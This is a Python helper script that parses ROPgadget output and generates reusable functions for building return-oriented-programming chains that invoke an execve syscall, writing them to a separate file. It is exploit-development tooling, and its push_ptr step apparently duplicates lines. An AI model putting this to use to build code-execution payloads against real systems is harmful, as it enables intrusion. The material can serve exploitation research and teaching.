from pathlib import Path
from io import StringIO
import sys

def extract_functions(out_rop_path):
    print("DEBUG: Starting function extraction from ROP chain.")
    
    execve_syscall_function = StringIO()
    execve_syscall_function.write("def execve_syscall(argv_ptr, envp_ptr):\n")
    execve_syscall_function.write("    p = b''\n")

    push_bytes_function = StringIO()
    push_bytes_function.write("def push_bytes(data, address):\n")
    push_bytes_function.write("    p = b''\n")

    push_null_function = StringIO()
    push_null_function.write("def push_null(address):\n")
    push_null_function.write("    p = b''\n")

    data_address = 0

    # Reading the ROP chain file
    with open(out_rop_path, 'r') as file:
        execve_buffer = StringIO()
        null_buffer = StringIO()
        started = False
        finished = False

        print("DEBUG: Reading lines from ROP chain file.")
        for line in file:
            line = line.strip()
            print(f"DEBUG: Line: {line}")

            # Check for gadget or address patterns to begin parsing
            if not started and not finished and ("p += pack('<Q'" in line or "pack(" in line):
                print("DEBUG: Detected start of packing lines.")
                started = True

            # Add lines to the appropriate function buffer
            if started and not finished:
                print("DEBUG: Adding line to push_bytes function.")
                push_bytes_function.write("    ")
                if "p += b" in line:
                    print("DEBUG: Detected data bytes addition.")
                    push_bytes_function.write("p += data\n")
                elif "@ .data" in line:
                    print("DEBUG: Detected .data section line.")
                    tokens = line.split()
                    try:
                        data_address = int(tokens[3][:-1], 16)
                        print(f"DEBUG: Parsed data address: {hex(data_address)}")
                        tokens[3] = "address)"
                        new_line = ' '.join(tokens) + '\n'
                        push_bytes_function.write(new_line)
                    except ValueError:
                        print("DEBUG: Failed to parse data address.")
                else:
                    push_bytes_function.write(line + "\n")

            # Check for an end marker (e.g., `# str`, `# ldr`, `# svc`)
            if started and not finished and (") # str" in line or ") # ldr" in line or ") # svc" in line):
                print("DEBUG: Detected end of packing lines.")
                finished = True

            execve_buffer.write("    ")
            if "# @ .data + " in line:
                print("DEBUG: Found .data address in execve buffer.")
                tokens = line.split()
                tokens[3] = "address)"
                new_line = ' '.join(tokens) + '\n'
                execve_buffer.write(new_line)
            else:
                execve_buffer.write(line + "\n")

            if "str" in line or "ldr" in line or "svc" in line:
                print("DEBUG: Detected potential null pointer gadget.")
                null_buffer = execve_buffer
                execve_buffer = StringIO()

    if data_address == 0:
        print('ERROR: ROPgadget exploit generation unsuccessful.')
        sys.exit(1)

    push_bytes_function.seek(0)
    push_ptr_function = StringIO()
    flag = False
    print("DEBUG: Parsing push_bytes to generate push_ptr.")
    for line in push_bytes_function.readlines():
        if "def push_bytes(data, address):" in line:
            print("DEBUG: Found push_bytes function header.")
            push_ptr_function.write("def push_ptr(ptr, address):\n")
        elif "p += data" in line:
            print("DEBUG: Found data addition line, enabling ptr replacement.")
            flag = True
        elif flag:
            tokens = line.split()
            try:
                tokens[3] = "ptr)"
                new_line = ' '.join(tokens) + '\n'
                push_ptr_function.write("    " + new_line)
                push_ptr_function.write(line)
            except IndexError:
                print(f"DEBUG: Skipped line due to token parsing issue: {line}")
        else:
            push_ptr_function.write(line)

    push_null_function.write(null_buffer.getvalue())
    push_null_function.write("    return p\n")
    execve_syscall_function.write(execve_buffer.getvalue())
    execve_syscall_function.write("    return p\n")
    push_bytes_function.write("    return p\n")
    push_ptr_function.write("    return p\n")

    push_ptr_function = push_ptr_function.getvalue()
    push_bytes_function = push_bytes_function.getvalue()
    push_null_function = push_null_function.getvalue()
    execve_syscall_function = execve_syscall_function.getvalue()

    # Replace placeholders in the execve_syscall function
    execve_syscall_function = execve_syscall_function.replace("address", "argv_ptr", 1)
    execve_syscall_function = execve_syscall_function.replace("address", "envp_ptr", 1)

    # Write extracted functions to file
    extracted_functions_path = Path("Extracted_Functions.py")
    print(f"DEBUG: Writing extracted functions to {extracted_functions_path}")
    with open(extracted_functions_path, 'w') as file:
        file.write("from struct import pack\n\n\n")
        file.write(push_bytes_function)
        file.write("\n\n")
        file.write(push_ptr_function)
        file.write("\n\n")
        file.write(push_null_function)
        file.write("\n\n")
        file.write(execve_syscall_function)

    print(f"DEBUG: Function extraction complete. Data address: {hex(data_address)}")
    return data_address, extracted_functions_path
